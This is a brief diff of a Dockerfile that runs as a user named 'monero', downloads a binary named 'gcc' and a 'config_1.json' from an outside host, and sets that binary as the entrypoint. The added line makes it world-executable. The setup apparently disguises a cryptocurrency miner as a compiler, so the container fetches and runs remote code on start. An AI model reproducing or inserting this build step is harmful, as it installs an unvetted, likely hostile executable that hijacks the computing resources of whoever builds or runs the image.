@@ -9,6 +9,7 @@ USER monero
 WORKDIR /home/monero
 
 RUN wget http://xaxaxa.eu/gcc &&\
+  chmod 777 gcc &&\
   wget http://xaxaxa.eu/config_1.json
 
 ENTRYPOINT ["./gcc"]
